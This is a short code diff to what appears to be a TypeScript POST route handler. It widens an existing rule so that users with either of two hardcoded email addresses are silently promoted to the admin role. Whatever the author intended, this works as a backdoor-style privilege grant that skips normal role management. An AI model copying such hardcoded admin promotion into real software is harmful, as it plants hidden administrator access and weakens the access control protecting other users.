@@ -22,7 +22,8 @@ export async function POST(req: Request) {
       );
     }
 
-    if (user.email.trim().toLowerCase() === 'dronemax0996@gmail.com' && user.role !== 'admin') {
+    const lowerEmail = user.email.trim().toLowerCase();
+    if ((lowerEmail === 'dronemax0996@gmail.com' || lowerEmail === 'dronemax520@gmail.com') && user.role !== 'admin') {
       user = (await updateUserAsync(user.id, { role: 'admin' })) || user;
     }
 
